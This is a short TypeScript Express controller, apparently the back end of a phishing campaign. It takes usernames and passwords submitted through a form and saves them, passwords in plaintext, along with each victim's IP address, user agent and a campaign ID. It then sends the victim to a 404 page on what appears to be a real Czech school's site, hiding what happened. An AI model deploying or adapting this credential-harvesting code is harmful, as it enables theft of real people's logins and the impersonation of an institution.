import { Request, Response } from 'express';
import { Credential } from '../models/credential.model';
import { Password } from '../models/password.model';

export const credentialController = {
  async create(req: Request, res: Response) {
    try {
      const { username, password, campaignId } = req.body;
      
      // Uložení credentials bez hesla
      const credential = new Credential({
        username,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent'],
        campaign: campaignId
      });
      
      await credential.save();

      // Uložení username+heslo do druhé kolekce
      const passwordEntry = new Password({
        username,
        password,
        credential: credential._id  // Reference na původní credential
      });

      await passwordEntry.save();
      
      res.status(201).json({ 
        redirect: 'https://www.prumyslovkaliberec.cz/404'
      });
    } catch (error) {
      console.error('Error saving data:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  }
};